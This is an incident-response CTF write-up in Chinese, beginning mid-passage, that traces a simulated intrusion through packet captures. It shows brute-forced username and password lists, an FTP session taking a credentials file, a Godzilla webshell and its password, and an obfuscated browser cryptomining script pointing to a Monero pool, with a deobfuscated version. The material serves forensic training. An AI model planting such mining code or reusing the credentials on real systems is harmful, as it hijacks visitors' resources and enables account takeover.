class="string">&quot;BJ2024014&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024013&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024017&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024002&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024015&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024004&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024010&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024020&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024019&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024012&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024009&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024003&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024001&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024006&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;BJ2024008&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;full_name&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot; &quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;888888&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;Ch@19980808&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;cy1988&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;fengjuan88&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;gx_fly&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;hmm123456&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;JX777&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;kongli000&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;Lina_666&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;luyuan@bj&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;minmin99&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;password&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;sgd@top&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;tianmi_sweet&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;weiping&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;wJ_1995&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;wq2024&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;zhangwei123&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;zhaolei_01&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;zhoupeng2023&quot;</span></span><br><span class="line">        <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">          <span class="string">&quot;sunyue&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;chenhao&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;changyuan&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;fengjuan&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;gaoxiang&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;hanmeimei&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;jiangxin&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;kongli&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;lina&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;luyuan&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;liumin&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;zhengfei&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;shigandang&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;tianmi&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;weiping&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;wujing&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;wangqiang&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;zhangwei&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;zhaolei&quot;</span><span class="punctuation">,</span></span><br><span class="line">          <span class="string">&quot;zhoupeng&quot;</span></span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;total_requests&quot;</span><span class="punctuation">:</span> <span class="number">5752</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;analysis_time&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2025-11-30T20:31:09.957102&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>所以提交的flag为：flag{sunyue-chenhao}</p>
<h2 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h2><p>黑客通过获取的用户名密码，利用密码复用技术，爆破了FTP服务，分析流量以后找到开放的FTP端口，并找到黑客登录成功后获取的私密文件，提交其文件中内容，提交格式：flag{xxx}</p>
<p>这里题目给的ftp端口是2121，另外ftp数据流会有一个特征 ， “successfully”，我们利用这两点来过滤一下：</p>
<p><code>tcp.port==2121&amp;&amp;tcp contains &quot;successfully&quot;</code></p>
<p><img src="https://cdn4.winhlb.com/2025/12/13/693d36c413920.png" alt="应急响应1png.png"></p>
<p>然后追踪一下tcp流，可以看到一些信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">220 (vsFTPd 3.0.3)</span><br><span class="line">USER wangqiang</span><br><span class="line">331 Please specify the password.</span><br><span class="line">PASS wq2024</span><br><span class="line">230 Login successful.</span><br><span class="line">opts utf8 on</span><br><span class="line">200 Always in UTF8 mode.</span><br><span class="line">syst</span><br><span class="line">215 UNIX Type: L8</span><br><span class="line">site help</span><br><span class="line">214 CHMOD UMASK HELP</span><br><span class="line">PWD</span><br><span class="line">257 &quot;/home/wangqiang&quot; is the current directory</span><br><span class="line">TYPE A</span><br><span class="line">200 Switching to ASCII mode.</span><br><span class="line">PASV</span><br><span class="line">227 Entering Passive Mode (192,168,37,4,195,83).</span><br><span class="line">LIST</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">226 Directory send OK.</span><br><span class="line">noop</span><br><span class="line">200 NOOP ok.</span><br><span class="line">CWD /home/wangqiang/ftp/</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">TYPE A</span><br><span class="line">200 Switching to ASCII mode.</span><br><span class="line">PASV</span><br><span class="line">227 Entering Passive Mode (192,168,37,4,195,87).</span><br><span class="line">LIST</span><br><span class="line">150 Here comes the directory listing.</span><br><span class="line">226 Directory send OK.</span><br><span class="line">noop</span><br><span class="line">200 NOOP ok.</span><br><span class="line">CWD /home/wangqiang/ftp/</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">noop</span><br><span class="line">200 NOOP ok.</span><br><span class="line">CWD /home/wangqiang/ftp/</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">PWD</span><br><span class="line">257 &quot;/home/wangqiang/ftp&quot; is the current directory</span><br><span class="line">CWD /home/wangqiang/ftp/</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">TYPE I</span><br><span class="line">200 Switching to Binary mode.</span><br><span class="line">PASV</span><br><span class="line">227 Entering Passive Mode (192,168,37,4,195,85).</span><br><span class="line">SIZE sensitive_credentials.txt</span><br><span class="line">213 62</span><br><span class="line">RETR sensitive_credentials.txt</span><br><span class="line">150 Opening BINARY mode data connection for sensitive_credentials.txt (62 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">CWD /home/wangqiang/ftp/</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">noop</span><br><span class="line">200 NOOP ok.</span><br><span class="line">CWD /home/wangqiang/ftp/</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">PWD</span><br><span class="line">257 &quot;/home/wangqiang/ftp&quot; is the current directory</span><br><span class="line">CWD /home/wangqiang/ftp/</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">TYPE I</span><br><span class="line">200 Switching to Binary mode.</span><br><span class="line">PASV</span><br><span class="line">227 Entering Passive Mode (192,168,37,4,195,90).</span><br><span class="line">SIZE sensitive_credentials.txt</span><br><span class="line">213 62</span><br><span class="line">RETR sensitive_credentials.txt</span><br><span class="line">150 Opening BINARY mode data connection for sensitive_credentials.txt (62 bytes).</span><br><span class="line">226 Transfer complete.</span><br><span class="line">CWD /home/wangqiang/ftp/</span><br><span class="line">250 Directory successfully changed.</span><br><span class="line">421 Timeout.</span><br></pre></td></tr></table></figure>

<p>很明显可以看到一段交互的FTP流量，其中 <code>RETR sensitive_credentials.txt</code> 就是传输下载文件的意思。</p>
<p>flag为该文件的内容，通过分析这段流量可以知道文件位于 &#x2F;home&#x2F;wangqiang&#x2F;ftp目录下；提交即可。</p>
<h2 id="步骤3"><a href="#步骤3" class="headerlink" title="步骤3"></a>步骤3</h2><p>可恶的黑客找到了任意文件上传点，你需要分析日志和流量以及web开放的程序找到黑客上传的文件，提交木马使用的密码，提交格式：flag{password}</p>
<p>有个流量分析工具<code>Zui</code>，可以做一些直观展示的操作：</p>
<p><code>count() by id.orig_h,status_code,uri | status_code == 200 | sort -r count</code></p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZMNOFx"><img src="https://s41.ax1x.com/2025/12/13/pZMNOFx.png" alt="pZMNOFx.png"></a></p>
<p>有个<code>shell1.php</code>，这种就很像后门，并且文件上传一般都是POST方式，所以我们可以在wireshark在进行筛选过滤一下，然后追踪一下tcp流就发现了🐎</p>
<p><code>http.request.method==POST</code> -&gt; 追踪TCP流</p>
<p><img src="https://cdn4.winhlb.com/2025/12/13/693d36e00fa00.png" alt="应急响应3.png"></p>
<p>flag{woaiwojia}</p>
<h2 id="步骤4"><a href="#步骤4" class="headerlink" title="步骤4"></a>步骤4</h2><p>删除黑客上传的木马并在&#x2F;var&#x2F;flag&#x2F;1&#x2F;flag查看flag值进行提交</p>
<p>这个没什么好说的，去<code>/var/www/html/public/uploads</code> 目录下面把 <code>shell1.php</code>删除就行了。这里猜测它是有一个check机制，发现这个文件不存在就会生成一个 &#x2F;var&#x2F;flag&#x2F;1&#x2F;flag 文件，然后读里面的内容就行了。</p>
<h2 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h2><p>分析流量，黑客植入了一个web挖矿木马，这个木马现实情况下会在用户访问后消耗用户的资源进行挖矿(本环境已做无害化处理)，提交黑客上传这个文件时的初始名称，提交格式：flag{xxx.xxx}</p>
<p>步骤三中可以看到上传的马是哥斯拉，特征很明显。并且pass和key都给了。我们直接用工具来解密后面的流量；</p>
<p>流7109的流量解密下发现：</p>
<p><a target="_blank" rel="noopener" href="https://imgchr.com/i/pZMNXY6"><img src="https://s41.ax1x.com/2025/12/13/pZMNXY6.png" alt="pZMNXY6.png"></a></p>
<p>把index.php删了，我们接着去跟下一个流，看做了哪些操作，翻到流7113的时候，发现把map.php移到&#x2F;var&#x2F;www&#x2F;html&#x2F;public 目录下并重名为index.php：</p>
<p><img src="https://cdn4.winhlb.com/2025/12/13/693d36de0d9e8.png" alt="应急响应5.png"></p>
<p>我们再进容器看一下index.php文件，发现一段代码很可疑：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x1c8d=[<span class="string">&#x27;fromCharCode&#x27;</span>,<span class="string">&#x27;|&#x27;</span>,<span class="string">&#x27;4|1|3|0|2&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;log&#x27;</span>,<span class="string">&#x27;This\x20will\x20never\x20run&#x27;</span>,<span class="string">&#x27;random&#x27;</span>,<span class="string">&#x27;floor&#x27;</span>,<span class="string">&#x27;now&#x27;</span>,<span class="string">&#x27;sqrt&#x27;</span>,<span class="string">&#x27;sin&#x27;</span>,<span class="string">&#x27;setTimeout&#x27;</span>,<span class="string">&#x27;push&#x27;</span>,<span class="string">&#x27;shift&#x27;</span>];(<span class="keyword">function</span>(<span class="params">_0x3e1a0f,_0x1c8d8d</span>)&#123;<span class="keyword">var</span> _0x5b3c2d=<span class="keyword">function</span>(<span class="params">_0x5a1d5c</span>)&#123;<span class="keyword">while</span>(--_0x5a1d5c)&#123;_0x3e1a0f[<span class="string">&#x27;push&#x27;</span>](_0x3e1a0f[<span class="string">&#x27;shift&#x27;</span>]());&#125;&#125;;<span class="title function_">_0x5b3c2d</span>(++_0x1c8d8d);&#125;(_0x1c8d,<span class="number">0x1f4</span>));<span class="keyword">var</span> _0x5b3c=<span class="keyword">function</span>(<span class="params">_0x3e1a0f,_0x1c8d8d</span>)&#123;_0x3e1a0f=_0x3e1a0f-<span class="number">0x0</span>;<span class="keyword">var</span> _0x5b3c2d=_0x1c8d[_0x3e1a0f];<span class="keyword">return</span> _0x5b3c2d;&#125;;<span class="keyword">var</span> _0x1b8d5c=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x5a1d5c=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x3c7e4b=!![];<span class="keyword">return</span> <span class="keyword">function</span>(<span class="params">_0x1b1f8e,_0x5a1d5c</span>)&#123;<span class="keyword">var</span> _0x3c1a2b=_0x3c7e4b?<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">if</span>(_0x5a1d5c)&#123;<span class="keyword">var</span> _0x1b8d5c=_0x5a1d5c[<span class="string">&#x27;apply&#x27;</span>](_0x1b1f8e,<span class="variable language_">arguments</span>);_0x5a1d5c=<span class="literal">null</span>;<span class="keyword">return</span> _0x1b8d5c;&#125;&#125;:<span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;;_0x3c7e4b=![];<span class="keyword">return</span> _0x3c1a2b;&#125;;&#125;();<span class="keyword">var</span> _0x3c7e4b=<span class="title function_">_0x1b8d5c</span>(<span class="variable language_">this</span>,<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x1b1f8e=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x5a1d5c;<span class="keyword">try</span>&#123;_0x5a1d5c=<span class="title function_">_0x1b8d5c</span>(<span class="string">&#x27;return\x20(function()\x20&#x27;</span>+<span class="string">&#x27;&#123;&#125;.constructor(\&quot;return\x20this\&quot;)()\x20&#x27;</span>+<span class="string">&#x27;);&#x27;</span>,<span class="string">&#x27;&#x27;</span>);&#125;<span class="keyword">catch</span>(_0x3c1a2b)&#123;_0x5a1d5c=<span class="variable language_">window</span>;&#125;<span class="keyword">return</span> _0x5a1d5c;&#125;;<span class="keyword">var</span> _0x5a1d5c=<span class="title function_">_0x1b1f8e</span>();<span class="keyword">var</span> _0x3c1a2b=_0x5a1d5c[<span class="string">&#x27;console&#x27;</span>]=_0x5a1d5c[<span class="string">&#x27;console&#x27;</span>]||&#123;&#125;;<span class="keyword">var</span> _0x1b8d5c=[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x4&#x27;</span>),<span class="string">&#x27;warn&#x27;</span>,<span class="string">&#x27;info&#x27;</span>,<span class="string">&#x27;error&#x27;</span>,<span class="string">&#x27;exception&#x27;</span>,<span class="string">&#x27;table&#x27;</span>,<span class="string">&#x27;trace&#x27;</span>];<span class="keyword">for</span>(<span class="keyword">var</span> _0x5b3c2d=<span class="number">0x0</span>;_0x5b3c2d&lt;_0x1b8d5c[<span class="string">&#x27;length&#x27;</span>];_0x5b3c2d++)&#123;<span class="keyword">var</span> _0x3c7e4b=_0x1b8d5c[<span class="string">&#x27;constructor&#x27;</span>][<span class="string">&#x27;prototype&#x27;</span>][<span class="string">&#x27;bind&#x27;</span>](_0x1b8d5c);<span class="keyword">var</span> _0x1b1f8e=_0x1b8d5c[_0x5b3c2d];<span class="keyword">var</span> _0x5a1d5c=_0x3c1a2b[_0x1b1f8e]||_0x3c7e4b;_0x3c7e4b[<span class="string">&#x27;__proto__&#x27;</span>]=_0x1b8d5c[<span class="string">&#x27;bind&#x27;</span>](_0x1b8d5c);_0x3c7e4b[<span class="string">&#x27;toString&#x27;</span>]=_0x5a1d5c[<span class="string">&#x27;toString&#x27;</span>][<span class="string">&#x27;bind&#x27;</span>](_0x5a1d5c);_0x3c1a2b[_0x1b1f8e]=_0x3c7e4b;&#125;&#125;);<span class="title function_">_0x3c7e4b</span>();<span class="keyword">var</span> _0x1b1f8e=&#123;&#125;;_0x1b1f8e[<span class="string">&#x27;p&#x27;</span>]=<span class="title class_">String</span>[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x0&#x27;</span>)](<span class="number">103</span>,<span class="number">117</span>,<span class="number">108</span>,<span class="number">102</span>,<span class="number">46</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">99</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">46</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">97</span>,<span class="number">109</span>,<span class="number">58</span>,<span class="number">49</span>,<span class="number">48</span>,<span class="number">49</span>,<span class="number">50</span>,<span class="number">56</span>);_0x1b1f8e[<span class="string">&#x27;l&#x27;</span>]=<span class="number">0.8</span>;<span class="keyword">var</span> _0x5b3c2d=<span class="keyword">function</span>(<span class="params"></span>)&#123;<span class="keyword">var</span> _0x3c7e4b=<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x2&#x27;</span>)[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x3&#x27;</span>)](<span class="string">&#x27;|&#x27;</span>);<span class="keyword">var</span> _0x1b8d5c=<span class="number">0x0</span>;<span class="keyword">while</span>(!![])&#123;<span class="keyword">switch</span>(_0x3c7e4b[_0x1b8d5c++])&#123;<span class="keyword">case</span><span class="string">&#x27;0&#x27;</span>:<span class="keyword">if</span>(<span class="title class_">Math</span>[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x7&#x27;</span>)](<span class="title class_">Math</span>[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x6&#x27;</span>)]()*<span class="number">100</span>)&gt;<span class="number">100</span>)&#123;<span class="variable language_">console</span>[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x4&#x27;</span>)](<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x5&#x27;</span>));&#125;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;1&#x27;</span>:<span class="keyword">while</span>(<span class="title class_">Date</span>[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x8&#x27;</span>)]()- _0x1b8d5c&lt;<span class="number">100</span>*_0x1b1f8e[<span class="string">&#x27;l&#x27;</span>])&#123;<span class="keyword">var</span> _0x5a1d5c=<span class="number">10000</span>;<span class="keyword">var</span> _0x3c1a2b=<span class="number">0x0</span>;<span class="keyword">for</span>(<span class="keyword">var</span> _0x3c7e4b=<span class="number">0x0</span>;_0x3c7e4b&lt;_0x5a1d5c;_0x3c7e4b++)&#123;_0x3c1a2b+=<span class="title class_">Math</span>[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x9&#x27;</span>)](_0x3c7e4b)*<span class="title class_">Math</span>[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0xa&#x27;</span>)](_0x3c7e4b);&#125;&#125;<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;2&#x27;</span>:<span class="variable language_">window</span>[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0xb&#x27;</span>)](_0x5b3c2d,<span class="number">100</span>*(<span class="number">1</span>-_0x1b1f8e[<span class="string">&#x27;l&#x27;</span>]));<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;3&#x27;</span>:<span class="keyword">var</span> _0x1b8d5c=<span class="title class_">Date</span>[<span class="title function_">_0x5b3c</span>(<span class="string">&#x27;0x8&#x27;</span>)]();<span class="keyword">continue</span>;<span class="keyword">case</span><span class="string">&#x27;4&#x27;</span>:<span class="keyword">continue</span>;&#125;<span class="keyword">break</span>;&#125;&#125;;<span class="title function_">_0x5b3c2d</span>();&#125;();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>我们扔给AI去分析一下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 原始代码的主要部分</span></span><br><span class="line">    <span class="keyword">var</span> targetServer = <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="number">103</span>, <span class="number">117</span>, <span class="number">108</span>, <span class="number">102</span>, <span class="number">46</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">110</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">111</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">110</span>, <span class="number">46</span>, <span class="number">115</span>, <span class="number">116</span>, <span class="number">114</span>, <span class="number">101</span>, <span class="number">97</span>, <span class="number">109</span>, <span class="number">58</span>, <span class="number">49</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">50</span>, <span class="number">56</span>);</span><br><span class="line">    <span class="comment">// targetServer = &quot;gulf.moneroocean.stream:10128&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">var</span> loadFactor = <span class="number">0.8</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">runMiningScript</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> startTime = <span class="title class_">Date</span>.<span class="title function_">now</span>();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 这是一个计算密集型的循环，用于占用CPU资源</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="title class_">Date</span>.<span class="title function_">now</span>() - startTime &lt; <span class="number">100</span> * loadFactor) &#123;</span><br><span class="line">            <span class="keyword">var</span> iterations = <span class="number">10000</span>;</span><br><span class="line">            <span class="keyword">var</span> result = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; iterations; i++) &#123;</span><br><span class="line">                result += <span class="title class_">Math</span>.<span class="title function_">sqrt</span>(i) * <span class="title class_">Math</span>.<span class="title function_">sin</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 这个条件永远不会成立，所以永远不会执行</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * <span class="number">100</span>) &gt; <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;This will never run&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 设置定时器，递归调用自身</span></span><br><span class="line">        <span class="variable language_">window</span>.<span class="built_in">setTimeout</span>(runMiningScript, <span class="number">100</span> * (<span class="number">1</span> - loadFactor));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 反调试代码 - 重写console对象的方法</span></span><br><span class="line">    (<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> originalConsole = <span class="variable language_">window</span>.<span class="property">console</span> = <span class="variable language_">window</span>.<span class="property">console</span> || &#123;&#125;;</span><br><span class="line">        <span class="keyword">var</span> methods = [<span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;warn&#x27;</span>, <span class="string">&#x27;info&#x27;</span>, <span class="string">&#x27;error&#x27;</span>, <span class="string">&#x27;exception&#x27;</span>, <span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;trace&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; methods.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">var</span> methodName = methods[i];</span><br><span class="line">            <span class="keyword">var</span> originalMethod = originalConsole[methodName] || <span class="keyword">function</span>(<span class="params"></span>) &#123;&#125;;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 重写console方法，使其更难调试</span></span><br><span class="line">            originalConsole[methodName] = (<span class="keyword">function</span>(<span class="params">name, original</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        original.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">                        <span class="comment">// 静默处理错误</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;)(methodName, originalMethod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 启动挖矿脚本</span></span><br><span class="line">    <span class="title function_">runMiningScript</span>();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>

<p>发现是个挖矿的脚本。所以map.php无疑了。</p>
<p>flag{map.php}</p>
